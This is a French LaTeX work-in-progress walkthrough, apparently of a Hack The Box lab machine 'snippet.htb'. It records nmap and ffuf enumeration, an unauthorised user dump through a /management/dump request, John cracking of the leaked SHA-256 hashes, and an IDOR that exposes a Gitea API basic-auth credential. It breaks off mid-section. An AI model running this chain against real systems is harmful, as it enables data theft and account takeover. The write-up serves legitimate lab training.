\chapter{[WIP] Extension}
\begin{itemize}
    \item {\bf technics}: 
    \item {\bf Components}: 
    \item {\bf tools}: 
\end{itemize}


\section{nmap}
\begin{verbatim}
TARGET_IP=10.10.11.171
$ PORTS=$( sudo nmap --min-rate=1000 -T4 -p- $TARGET_IP | grep '^[0-9]' | 
    cut -d'/' -f 1 | tr '\n' ',' | sed s/',$'//)
$ echo $PORTS
$ sudo nmap -sVC -p$PORTS $TARGET_IP
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 8221e2a5824ddf3f99db3ed9b3265286 (RSA)
|   256 913ab2922b637d91f1582b1b54f9703c (ECDSA)
|_  256 6520392ba73b33e5ed49a9acea01bd37 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: snippet.htb
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

\end{verbatim}

\section{http snippet.htb}
dans le code source
\begin{verbatim}
const Ziggy = {
        "url": "http:\/\/snippet.htb",
        "port": null,
        "defaults": {},
        "routes": {
          "ignition.healthCheck": {
            "uri": "_ignition\/health-check",
            "methods": ["GET", "HEAD"]
          },
          "ignition.executeSolution": {
            "uri": "_ignition\/execute-solution",
            "methods": ["POST"]
          },
          "ignition.shareReport": {
            "uri": "_ignition\/share-report",
            "methods": ["POST"]
          },
          "ignition.scripts": {
            "uri": "_ignition\/scripts\/{script}",
            "methods": ["GET", "HEAD"]
          },
          "ignition.styles": {
            "uri": "_ignition\/styles\/{style}",
            "methods": ["GET", "HEAD"]
          },
          "dashboard": {
            "uri": "dashboard",
            "methods": ["GET", "HEAD"]
          },
          "users": {
            "uri": "users",
            "methods": ["GET", "HEAD"]
          },
          "snippets": {
            "uri": "snippets",
            "methods": ["GET", "HEAD"]
          },
          "snippets.view": {
            "uri": "snippets\/{id}",
            "methods": ["GET", "HEAD"]
          },
          "snippets.update": {
            "uri": "snippets\/update\/{id}",
            "methods": ["GET", "HEAD"]
          },
          "api.snippets.update": {
            "uri": "snippets\/update\/{id}",
            "methods": ["POST"]
          },
          "api.snippets.delete": {
            "uri": "snippets\/delete\/{id}",
            "methods": ["DELETE"]
          },
          "snippets.new": {
            "uri": "new",
            "methods": ["GET", "HEAD"]
          },
          "users.validate": {
            "uri": "management\/validate",
            "methods": ["POST"]
          },
          "admin.management.dump": {
            "uri": "management\/dump",
            "methods": ["POST"]
          },
          "register": {
            "uri": "register",
            "methods": ["GET", "HEAD"]
          },
          "login": {
            "uri": "login",
            "methods": ["GET", "HEAD"]
          },
          "password.request": {
            "uri": "forgot-password",
            "methods": ["GET", "HEAD"]
          },
          "password.email": {
            "uri": "forgot-password",
            "methods": ["POST"]
          },
          "password.reset": {
            "uri": "reset-password\/{token}",
            "methods": ["GET", "HEAD"]
          },
          "password.update": {
            "uri": "reset-password",
            "methods": ["POST"]
          },
          "verification.notice": {
            "uri": "verify-email",
            "methods": ["GET", "HEAD"]
          },
          "verification.verify": {
            "uri": "verify-email\/{id}\/{hash}",
            "methods": ["GET", "HEAD"]
          },
          "verification.send": {
            "uri": "email\/verification-notification",
            "methods": ["POST"]
          },
          "password.confirm": {
            "uri": "confirm-password",
            "methods": ["GET", "HEAD"]
          },
          "logout": {
            "uri": "logout",
            "methods": ["POST"]
          }
        }
      };
\end{verbatim}

\begin{verbatim}
$ ffuf -u http://snippet.htb/FUZZ -w test.text
confirm-password        [Status: 302, Size: 342, Words: 60, Lines: 12, Duration: 111ms]
snippets                [Status: 302, Size: 342, Words: 60, Lines: 12, Duration: 109ms]
verify-email/{id}/{hash} [Status: 302, Size: 342, Words: 60, Lines: 12, Duration: 111ms]
management/dump         [Status: 405, Size: 825, Words: 132, Lines: 23, Duration: 127ms]
logout                  [Status: 405, Size: 825, Words: 132, Lines: 23, Duration: 137ms]
dashboard               [Status: 302, Size: 342, Words: 60, Lines: 12, Duration: 143ms]
reset-password          [Status: 405, Size: 825, Words: 132, Lines: 23, Duration: 183ms]
reset-password/{token}  [Status: 200, Size: 37830, Words: 1022, Lines: 30, Duration: 147ms]
management/validate     [Status: 405, Size: 825, Words: 132, Lines: 23, Duration: 197ms]
email/verification-notification [Status: 405, Size: 825, Words: 132, Lines: 23, Duration: 199ms]
users                   [Status: 302, Size: 342, Words: 60, Lines: 12, Duration: 209ms]
login                   [Status: 200, Size: 37797, Words: 1022, Lines: 30, Duration: 174ms]
forgot-password         [Status: 200, Size: 37782, Words: 1022, Lines: 30, Duration: 169ms]
_ignition/share-report  [Status: 405, Size: 825, Words: 132, Lines: 23, Duration: 216ms]
snippets/delete/{id}    [Status: 405, Size: 825, Words: 132, Lines: 23, Duration: 232ms]
snippets/{id}           [Status: 302, Size: 342, Words: 60, Lines: 12, Duration: 235ms]
new                     [Status: 302, Size: 342, Words: 60, Lines: 12, Duration: 249ms]
_ignition/execute-solution [Status: 405, Size: 825, Words: 132, Lines: 23, Duration: 260ms]
snippets/update/{id}    [Status: 302, Size: 342, Words: 60, Lines: 12, Duration: 265ms]
verify-email            [Status: 302, Size: 342, Words: 60, Lines: 12, Duration: 283ms]
snippets/update/{id}    [Status: 302, Size: 342, Words: 60, Lines: 12, Duration: 300ms]
register                [Status: 200, Size: 37745, Words: 1022, Lines: 30, Duration: 283ms]
forgot-password         [Status: 200, Size: 37782, Words: 1022, Lines: 30, Duration: 305ms]

\end{verbatim}


On a 2 tokens:
\begin{itemize}
    \item \verb+snippethtb_session+
    \item \verb+XSRF-TOKEN+
\end{itemize}

quand on les url decoe puis base64 decode on obtient un json avec \verb+iv+,
\verb+value+, \verb+mac+, \verb+tag+

\begin{verbatim}
{"iv":"lE7lCwY6LNRIcTIslRnmKA==","value":"WfqkpA3MPAOSV9Duc2qBnmhtPlk2q9sJNByC4cH76wntXzoVjSerSvSf12G/z1aSbv0bpUja7gAuECuOieor8plb7bUMeJqMauTkGAK2GSKcKsBVTVVVbDZFGG0l0Vg/","mac":"80c0062db696db694bb31bdb7d3831365007daa3c26978e152fd4cb0bfb288e3","tag":""}

XSRF-TOKEN
"iv":"tTB2h1lKfytuK9PRe2vPyQ==","value":"l259CCMmwPzH43o5ley2lh91tfc2HQ21rdQobQbmbBBvkBf95Ih27O4A67OAw/sYJlAHQTkGihuwyUgCA0t/2/9a/xE9U1v6qSrNptvWxaTrJfLLbpkolfkNvKgvV/sG","mac":"7c54f48cac2f8af8f86a027079f16fea5b867ccad4c5d909ff09fffb44f5e6cf","tag":""}
\end{verbatim}

visiblement cela correspond à du laravel
\url{https://gist.github.com/fideloper/c4806c504e46e8cdb00a}


\url{https://securitynews.sonicwall.com/xmlpost/laravel-ignition-remote-code-execution-vulnerability/}
mais ne semble pas fonctionner


ne semble pas vuln a SQLi

\begin{verbatim}
$ ffuf -u http://snippet.htb -H 'Host: FUZZ.snippet.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fl 30

dev                     [Status: 200, Size: 12822, Words: 1029, Lines: 250, Duration: 32ms]
mail                    [Status: 200, Size: 5311, Words: 364, Lines: 97, Duration: 73ms]
\end{verbatim}

\begin{verbatim}
$ curl   'http://snippet.htb/management/dump' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0' -H 'Accept: text/html, application/xhtml+xml' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'X-Requested-With: XMLHttpRequest' -H 'Content-Type: application/json' -H 'X-Inertia: true' -H 'X-Inertia-Version: 207fd484b7c2ceeff7800b8c8a11b3b6' -H 'X-XSRF-TOKEN: eyJpdiI6IjBZQjl6SGxXNmtQZjJZbVY5UU4rOWc9PSIsInZhbHVlIjoiVTFRcW9GcE03anVWT05Id3ZDc2h3ZlhXeS84Y2hONW5qeUxhN3Fsd1haOUdPekNQTjNvUG9JeEhOVDE3eTU0NlN1WGdNSi9oZHlnZ2x5azdVV2FLbEZrT1BGaFBDT0IweC8xNFlla3Bzcjl0KzVUbTI0aUV2Mk12WEZIelhTS0EiLCJtYWMiOiJmODVkY2RkNzdjM2Y3MDE5YjE2M2FlMzk0Y2I0NDEzNzM4NmQyZmNkYzA5MTkzODgzMTY3ZWRkMTQwNTUxNmFlIiwidGFnIjoiIn0=' -H 'Origin: http://snippet.htb' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Referer: http://snippet.htb/forgot-password' -H 'Cookie: snippethtb_session=eyJpdiI6IkhIbFBYTmZPRW4zZEx1ekwrWlcwV1E9PSIsInZhbHVlIjoiUzRROFVRcUtYZy8yOERpSkhFNkErRHRNaHNlWmNCMTZkOHdLYjVDSUpYWUxZaU9jSFF0RmNUZ1lQMjdoTVNzU0lyL3JlSXE2YVpBK2did2F4RWt5cVJWK2ROY21nMVpGSHZrajROZEcvQVh0TnErRnVkalFES1RRVmJNWkF6aHAiLCJtYWMiOiJlYmQzNzhkM2Q2YzU1NDJkMGVkNzEzYjJlMTk0YTUzYWI2MDJiMDZlNGU1ZDE1YzI0NWE5ZDJhNTM3NTMzNDQwIiwidGFnIjoiIn0%3D; XSRF-TOKEN=eyJpdiI6IjBZQjl6SGxXNmtQZjJZbVY5UU4rOWc9PSIsInZhbHVlIjoiVTFRcW9GcE03anVWT05Id3ZDc2h3ZlhXeS84Y2hONW5qeUxhN3Fsd1haOUdPekNQTjNvUG9JeEhOVDE3eTU0NlN1WGdNSi9oZHlnZ2x5azdVV2FLbEZrT1BGaFBDT0IweC8xNFlla3Bzcjl0KzVUbTI0aUV2Mk12WEZIelhTS0EiLCJtYWMiOiJmODVkY2RkNzdjM2Y3MDE5YjE2M2FlMzk0Y2I0NDEzNzM4NmQyZmNkYzA5MTkzODgzMTY3ZWRkMTQwNTUxNmFlIiwidGFnIjoiIn0%3D' -H 'Sec-GPC: 1' --data-raw '{}'
{"code":400,"message":"Missing arguments"}

$ ffuf -u  'http://snippet.htb/management/dump' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0' -H 'Accept: text/html, application/xhtml+xml' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'X-Requested-With: XMLHttpRequest' -H 'Content-Type: application/json' -H 'X-Inertia: true' -H 'X-Inertia-Version: 207fd484b7c2ceeff7800b8c8a11b3b6' -H 'X-XSRF-TOKEN: eyJpdiI6IjBZQjl6SGxXNmtQZjJZbVY5UU4rOWc9PSIsInZhbHVlIjoiVTFRcW9GcE03anVWT05Id3ZDc2h3ZlhXeS84Y2hONW5qeUxhN3Fsd1haOUdPekNQTjNvUG9JeEhOVDE3eTU0NlN1WGdNSi9oZHlnZ2x5azdVV2FLbEZrT1BGaFBDT0IweC8xNFlla3Bzcjl0KzVUbTI0aUV2Mk12WEZIelhTS0EiLCJtYWMiOiJmODVkY2RkNzdjM2Y3MDE5YjE2M2FlMzk0Y2I0NDEzNzM4NmQyZmNkYzA5MTkzODgzMTY3ZWRkMTQwNTUxNmFlIiwidGFnIjoiIn0=' -H 'Origin: http://snippet.htb' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Referer: http://snippet.htb/forgot-password' -H 'Cookie: snippethtb_session=eyJpdiI6IkhIbFBYTmZPRW4zZEx1ekwrWlcwV1E9PSIsInZhbHVlIjoiUzRROFVRcUtYZy8yOERpSkhFNkErRHRNaHNlWmNCMTZkOHdLYjVDSUpYWUxZaU9jSFF0RmNUZ1lQMjdoTVNzU0lyL3JlSXE2YVpBK2did2F4RWt5cVJWK2ROY21nMVpGSHZrajROZEcvQVh0TnErRnVkalFES1RRVmJNWkF6aHAiLCJtYWMiOiJlYmQzNzhkM2Q2YzU1NDJkMGVkNzEzYjJlMTk0YTUzYWI2MDJiMDZlNGU1ZDE1YzI0NWE5ZDJhNTM3NTMzNDQwIiwidGFnIjoiIn0%3D; XSRF-TOKEN=eyJpdiI6IjBZQjl6SGxXNmtQZjJZbVY5UU4rOWc9PSIsInZhbHVlIjoiVTFRcW9GcE03anVWT05Id3ZDc2h3ZlhXeS84Y2hONW5qeUxhN3Fsd1haOUdPekNQTjNvUG9JeEhOVDE3eTU0NlN1WGdNSi9oZHlnZ2x5azdVV2FLbEZrT1BGaFBDT0IweC8xNFlla3Bzcjl0KzVUbTI0aUV2Mk12WEZIelhTS0EiLCJtYWMiOiJmODVkY2RkNzdjM2Y3MDE5YjE2M2FlMzk0Y2I0NDEzNzM4NmQyZmNkYzA5MTkzODgzMTY3ZWRkMTQwNTUxNmFlIiwidGFnIjoiIn0%3D' -H 'Sec-GPC: 1' -d '{"FUZZ": "toto"}' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.5.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://snippet.htb/management/dump
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
 :: Header           : Origin: http://snippet.htb
 :: Header           : Dnt: 1
 :: Header           : Cookie: snippethtb_session=eyJpdiI6IkhIbFBYTmZPRW4zZEx1ekwrWlcwV1E9PSIsInZhbHVlIjoiUzRROFVRcUtYZy8yOERpSkhFNkErRHRNaHNlWmNCMTZkOHdLYjVDSUpYWUxZaU9jSFF0RmNUZ1lQMjdoTVNzU0lyL3JlSXE2YVpBK2did2F4RWt5cVJWK2ROY21nMVpGSHZrajROZEcvQVh0TnErRnVkalFES1RRVmJNWkF6aHAiLCJtYWMiOiJlYmQzNzhkM2Q2YzU1NDJkMGVkNzEzYjJlMTk0YTUzYWI2MDJiMDZlNGU1ZDE1YzI0NWE5ZDJhNTM3NTMzNDQwIiwidGFnIjoiIn0%3D; XSRF-TOKEN=eyJpdiI6IjBZQjl6SGxXNmtQZjJZbVY5UU4rOWc9PSIsInZhbHVlIjoiVTFRcW9GcE03anVWT05Id3ZDc2h3ZlhXeS84Y2hONW5qeUxhN3Fsd1haOUdPekNQTjNvUG9JeEhOVDE3eTU0NlN1WGdNSi9oZHlnZ2x5azdVV2FLbEZrT1BGaFBDT0IweC8xNFlla3Bzcjl0KzVUbTI0aUV2Mk12WEZIelhTS0EiLCJtYWMiOiJmODVkY2RkNzdjM2Y3MDE5YjE2M2FlMzk0Y2I0NDEzNzM4NmQyZmNkYzA5MTkzODgzMTY3ZWRkMTQwNTUxNmFlIiwidGFnIjoiIn0%3D
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0
 :: Header           : X-Inertia-Version: 207fd484b7c2ceeff7800b8c8a11b3b6
 :: Header           : Referer: http://snippet.htb/forgot-password
 :: Header           : Connection: keep-alive
 :: Header           : Sec-Gpc: 1
 :: Header           : X-Requested-With: XMLHttpRequest
 :: Header           : X-Inertia: true
 :: Header           : Accept-Encoding: gzip, deflate
 :: Header           : Content-Type: application/json
 :: Header           : X-Xsrf-Token: eyJpdiI6IjBZQjl6SGxXNmtQZjJZbVY5UU4rOWc9PSIsInZhbHVlIjoiVTFRcW9GcE03anVWT05Id3ZDc2h3ZlhXeS84Y2hONW5qeUxhN3Fsd1haOUdPekNQTjNvUG9JeEhOVDE3eTU0NlN1WGdNSi9oZHlnZ2x5azdVV2FLbEZrT1BGaFBDT0IweC8xNFlla3Bzcjl0KzVUbTI0aUV2Mk12WEZIelhTS0EiLCJtYWMiOiJmODVkY2RkNzdjM2Y3MDE5YjE2M2FlMzk0Y2I0NDEzNzM4NmQyZmNkYzA5MTkzODgzMTY3ZWRkMTQwNTUxNmFlIiwidGFnIjoiIn0=
 :: Header           : Accept: text/html, application/xhtml+xml
 :: Header           : Accept-Language: en-US,en;q=0.5
 :: Data             : {"FUZZ": "toto"}
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

_method                 [Status: 405, Size: 825, Words: 132, Lines: 23, Duration: 1484ms]
[WARN] Caught keyboard interrupt (Ctrl-C)

$ ffuf -u  'http://snippet.htb/management/dump' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0' -H 'Accept: text/html, application/xhtml+xml' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'X-Requested-With: XMLHttpRequest' -H 'Content-Type: application/json' -H 'X-Inertia: true' -H 'X-Inertia-Version: 207fd484b7c2ceeff7800b8c8a11b3b6' -H 'X-XSRF-TOKEN: eyJpdiI6IjBZQjl6SGxXNmtQZjJZbVY5UU4rOWc9PSIsInZhbHVlIjoiVTFRcW9GcE03anVWT05Id3ZDc2h3ZlhXeS84Y2hONW5qeUxhN3Fsd1haOUdPekNQTjNvUG9JeEhOVDE3eTU0NlN1WGdNSi9oZHlnZ2x5azdVV2FLbEZrT1BGaFBDT0IweC8xNFlla3Bzcjl0KzVUbTI0aUV2Mk12WEZIelhTS0EiLCJtYWMiOiJmODVkY2RkNzdjM2Y3MDE5YjE2M2FlMzk0Y2I0NDEzNzM4NmQyZmNkYzA5MTkzODgzMTY3ZWRkMTQwNTUxNmFlIiwidGFnIjoiIn0=' -H 'Origin: http://snippet.htb' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Referer: http://snippet.htb/forgot-password' -H 'Cookie: snippethtb_session=eyJpdiI6IkhIbFBYTmZPRW4zZEx1ekwrWlcwV1E9PSIsInZhbHVlIjoiUzRROFVRcUtYZy8yOERpSkhFNkErRHRNaHNlWmNCMTZkOHdLYjVDSUpYWUxZaU9jSFF0RmNUZ1lQMjdoTVNzU0lyL3JlSXE2YVpBK2did2F4RWt5cVJWK2ROY21nMVpGSHZrajROZEcvQVh0TnErRnVkalFES1RRVmJNWkF6aHAiLCJtYWMiOiJlYmQzNzhkM2Q2YzU1NDJkMGVkNzEzYjJlMTk0YTUzYWI2MDJiMDZlNGU1ZDE1YzI0NWE5ZDJhNTM3NTMzNDQwIiwidGFnIjoiIn0%3D; XSRF-TOKEN=eyJpdiI6IjBZQjl6SGxXNmtQZjJZbVY5UU4rOWc9PSIsInZhbHVlIjoiVTFRcW9GcE03anVWT05Id3ZDc2h3ZlhXeS84Y2hONW5qeUxhN3Fsd1haOUdPekNQTjNvUG9JeEhOVDE3eTU0NlN1WGdNSi9oZHlnZ2x5azdVV2FLbEZrT1BGaFBDT0IweC8xNFlla3Bzcjl0KzVUbTI0aUV2Mk12WEZIelhTS0EiLCJtYWMiOiJmODVkY2RkNzdjM2Y3MDE5YjE2M2FlMzk0Y2I0NDEzNzM4NmQyZmNkYzA5MTkzODgzMTY3ZWRkMTQwNTUxNmFlIiwidGFnIjoiIn0%3D' -H 'Sec-GPC: 1' -d '{"_method": "FUZZ"}' -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -fc 405

options                 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 1469ms]
\end{verbatim}

ne donne rien par contre a force on trouve que le payload c'est
\verb+{"download": "users"}+

on obtient un fichier \verb+.gz+
qui contien 895 users

\begin{verbatim}
$ cat dump |jq |grep password | cut -d':' -f2 | cut -d'"' -f2 > hashes
$ echo 02d2f1d50203951f81c99ec9eedc82ed65c6747dc13c07a945525215e3fe4b01 |hashid
Analyzing '02d2f1d50203951f81c99ec9eedc82ed65c6747dc13c07a945525215e3fe4b01'
[+] Snefru-256
[+] SHA-256
[+] RIPEMD-256
[+] Haval-256
[+] GOST R 34.11-94
[+] GOST CryptoPro S-Box
[+] SHA3-256
[+] Skein-256
[+] Skein-512(256)
$ john --format=raw-sha256 --wordlist=/usr/share/wordlists/passwords/rockyou.txt ./hashes
Using default input encoding: UTF-8
Loaded 892 password hashes with no different salts (Raw-SHA256 [SHA256 128/128 AVX 4x])
Warning: poor OpenMP scalability for this hash type, consider --fork=12
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password123      (?)
1g 0:00:00:01 DONE (2023-01-03 14:59) 0.9259g/s 13280Kp/s 13280Kc/s 12779MC/s 01.juli.92..*7¡Vamos!
Warning: passwords printed above might not be all those cracked
Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
Session completed

$ cat ~/.john/john.pot
$SHA256$ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f:password123
\end{verbatim}
on trouve:
\begin{verbatim}
gia@snippet.htb
juliana@snippet.htb
letha@snippet.htb
fredrick@snippet.htb
\end{verbatim}

Il semble que l'url \verb+http://snippet.htb/snippets/2+ soit vulnerable à l'IDOR


par contre le fuzz ne lui plait pas trop

\begin{verbatim}
$ ffuf -u 'http://snippet.htb/snippets/FUZZ' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Cookie: snippethtb_session=eyJpdiI6Ii8vazl0MlFGeEFSWnBEV2QzVUdJZ0E9PSIsInZhbHVlIjoibWZ0aDRUMVpiLytCY1ZkMm0yNitsTjJiOTV4SnVMZzdXV3dwL0hjcFFCS1RaN0ZKWDczYURpUmd5U0FhdkxSZ2hBTTN1MEFoRWdRWDU3NkxucE00bjdMU2tXY3hReHlWaDRuZ3pTL0ljeUNEb0dYZlkzY044cHAzT1p6ZmpLdFgiLCJtYWMiOiI3YTJiM2I5ZDllZGFhNDA5ZjQzNmMzZDQ2YzA4MmU4ZjJlY2EyNjEwYmRiZTU2ZTMxYTI2MGRlZWU1NmRiNDI1IiwidGFnIjoiIn0%3D; XSRF-TOKEN=eyJpdiI6IjZkUks1Yks4eXZvYTQwRCswRU8yWVE9PSIsInZhbHVlIjoiRzNjdncyNTlGYjEva1M4aVc3TC9HZmRXRjQ3WDY0M0JCMkt0NS9Nck5la01QY1JJZUVaZ1ptZ1FqeWhGd0JPRElGYStvUmdiOGQ0MVIzNklHd05mci9kbzhXL3VRNWZwWklZek1kVDVoWnYvdFd1b1VzUDVBRXNvSURCc0JDb1YiLCJtYWMiOiIyZjg4OTk5MzllMmY4YzA0ZmJjOWY1ZWQzM2Q4ZTRlZGUyY2NlMGZmMDQ5MmFmYmIzN2E2MmUyMDVkZjNlMWUzIiwidGFnIjoiIn0%3D' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-GPC: 1' -w /usr/share/seclists/Fuzzing/3-digits-000-999.txt -fc 500

002                     [Status: 200, Size: 12644, Words: 53, Lines: 51, Duration: 377ms]
001                     [Status: 200, Size: 12830, Words: 56, Lines: 63, Duration: 731ms]
\end{verbatim}


\begin{verbatim}
<div id="app" data-page="{"component":"ViewSnippet","props":{"errors":{},"auth":{"user":{"id":669,"name":"Gia Stehr","email":"gia@snippet.htb","email_verified_at":"2022-01-02T20:15:30.000000Z","created_at":"2022-01-02T20:15:37.000000Z","updated_at":"2022-06-15T19:55:53.000000Z","user_type":"Member","cs":"d986f9f29d2d6b81ae48cc7c6f7dd520071e3ad90665dedefe033962b4c7d736"}},"flash":{"message":null},"snippet":{"id":1,"created_at":null,"updated_at":null,"content":"function getClipBoard() {\r\n    const el = document.createElement(\"div\");\r\n    document.body.appendChild(el);\r\n    el.contentEditable = true;\r\n    el.style = {position: 'absolute', left: '-9999px'};\r\n\r\n    const range = document.createRange();\r\n    range.selectNode(el);\r\n    window.getSelection().removeAllRanges();\r\n    window.getSelection().addRange(range);\r\n    el.focus();\r\n    document.execCommand(\"paste\");\r\n    return el.innerHTML;\r\n}","language":"JavaScript","user_id":31,"name":"JavaScript get clipboard","public":1,"user":{"id":31,"name":"Isaac Heller","email":"isaac@snippet.htb","email_verified_at":"2022-01-02T20:13:34.000000Z","created_at":"2022-01-02T20:13:36.000000Z","updated_at":"2022-01-02T20:13:36.000000Z","user_type":"Member","cs":"14d057b33af08c39c52b505608a00cb6cac720fdefea60b865921157722ae8f1"}},"user_id":669},"url":"\/snippets\/1","version":"207fd484b7c2ceeff7800b8c8a11b3b6"}"></div>

{
   "component":"ViewSnippet",
   "props":{
      "errors":{

      },
      "auth":{
         "user":{
            "id":669,
            "name":"Gia Stehr",
            "email":"gia@snippet.htb",
            "email_verified_at":"2022-01-02T20:15:30.000000Z",
            "created_at":"2022-01-02T20:15:37.000000Z",
            "updated_at":"2022-06-15T19:55:53.000000Z",
            "user_type":"Member",
            "cs":"d986f9f29d2d6b81ae48cc7c6f7dd520071e3ad90665dedefe033962b4c7d736"
         }
      },
      "flash":{
         "message":null
      },
      "snippet":{
         "id":1,
         "created_at":null,
         "updated_at":null,
         "content":"function getClipBoard() {\r\n    const el = document.createElement(\"div\");\r\n    document.body.appendChild(el);\r\n    el.contentEditable = true;\r\n    el.style = {position: 'absolute', left: '-9999px'};\r\n\r\n    const range = document.createRange();\r\n    range.selectNode(el);\r\n    window.getSelection().removeAllRanges();\r\n    window.getSelection().addRange(range);\r\n    el.focus();\r\n    document.execCommand(\"paste\");\r\n    return el.innerHTML;\r\n}",
         "language":"JavaScript",
         "user_id":31,
         "name":"JavaScript get clipboard",
         "public":1,
         "user":{
            "id":31,
            "name":"Isaac Heller",
            "email":"isaac@snippet.htb",
            "email_verified_at":"2022-01-02T20:13:34.000000Z",
            "created_at":"2022-01-02T20:13:36.000000Z",
            "updated_at":"2022-01-02T20:13:36.000000Z",
            "user_type":"Member",
            "cs":"14d057b33af08c39c52b505608a00cb6cac720fdefea60b865921157722ae8f1"
         }
      },
      "user_id":669
   },
   "url":"\/snippets\/1",
   "version":"207fd484b7c2ceeff7800b8c8a11b3b6"
}
\end{verbatim}

donc on a une notion de snippet public ou privée. la question est est-il
possible de passer la snippet 2 qui semble privée en public en passant un
update. Le truc c'est qu'il faut esperer que l'on puisse passer seulement le
flag \verb+public+ sinon on ecrase son contenu.

visiblement cela fonctionne:
\begin{verbatim}
POST /snippets/update/2 HTTP/1.1
Host: snippet.htb
Content-Length: 15
Accept: text/html, application/xhtml+xml
X-XSRF-TOKEN: eyJpdiI6Ii9uK3haanRxeXlLY3ZNNXpyZUpkVkE9PSIsInZhbHVlIjoiVTVDL09tMnlnLzJTWUFyVzFoSHpjd01xQ0JpUWN5eWpNVTV1UDM4MTRDRWpiTXZQTTZxUHBDczFsdUFLaFB6U09TTE8vOElFYWNNTFNCaDAvTXhRcUZtV2hwMW93TEo0RmNFWnVhY3RrMEFnZlhUUXo0emY4V2x2SGYzdHYxMHMiLCJtYWMiOiIzZGM2NjM4MTJjNDk2ZDIwYWU5MDYzZTRmNDcwNTJjMjMzMmZkM2NiNzIxMmUxMDc1OGYxN2NkZTNiNzgzNjU2IiwidGFnIjoiIn0=
X-Inertia-Version: 207fd484b7c2ceeff7800b8c8a11b3b6
X-Requested-With: XMLHttpRequest
X-Inertia: true
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Content-Type: application/json
Origin: http://snippet.htb
Referer: http://snippet.htb/snippets/update/4
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: XSRF-TOKEN=eyJpdiI6Ii9uK3haanRxeXlLY3ZNNXpyZUpkVkE9PSIsInZhbHVlIjoiVTVDL09tMnlnLzJTWUFyVzFoSHpjd01xQ0JpUWN5eWpNVTV1UDM4MTRDRWpiTXZQTTZxUHBDczFsdUFLaFB6U09TTE8vOElFYWNNTFNCaDAvTXhRcUZtV2hwMW93TEo0RmNFWnVhY3RrMEFnZlhUUXo0emY4V2x2SGYzdHYxMHMiLCJtYWMiOiIzZGM2NjM4MTJjNDk2ZDIwYWU5MDYzZTRmNDcwNTJjMjMzMmZkM2NiNzIxMmUxMDc1OGYxN2NkZTNiNzgzNjU2IiwidGFnIjoiIn0%3D; snippethtb_session=eyJpdiI6Iml4ZXpyM2dNVmZOTm1rUENwR0RiK3c9PSIsInZhbHVlIjoidzJ0ZEdIbEsydkZGY2pPQzVvcW1OblUvME9SRnU2bC9IUlc0dnV4K29RdE5oVGR3UjJDUkFtNWJiUEZGbDdHSFdESnFzK0UvUWpab01reWhHeWFWY1ptZ1FsU2E4NDRxNzVCc2ZyVUtXUzF2UXBqOGtUNm9PbHg2VEkzMlkrdlYiLCJtYWMiOiJlMTZjMzM0ZGJjYzBjMWU4OTY0Zjg5MmI2ZThjZjA3MzdjNzMzMmQ5YWE4NzQ1YjQ5MWNkZDdiMDMzNjgzNzhlIiwidGFnIjoiIn0%3D
Connection: close

{"public":true}
\end{verbatim}

on voit alors

\begin{verbatim}
curl -XGET http://dev.snippet.htb/api/v1/users/jean/tokens 
    -H 'accept: application/json' 
    -H 'authorization: basic amVhbjpFSG1mYXIxWTdwcEE5TzVUQUlYblluSnBB'
\end{verbatim}


\section{http dev.snippet.htb}
\verb+Gitea API.  1.15.8+

creer un compte toto@toto.fr password123 dev01

on a 3 users:
\begin{verbatim}
[administrator] administrator
administrator@snippet.htb
Joined on Dec 27, 2021
[charlie] charlie
charlie@snippet.htb
Joined on Dec 27, 2021
[dev01] dev01
toto@toto.fr
Joined on Jan 03, 2023
[jean] jean
jean@snippet.htb Joined on Dec 27, 2021 
\end{verbatim}

\begin{verbatim}
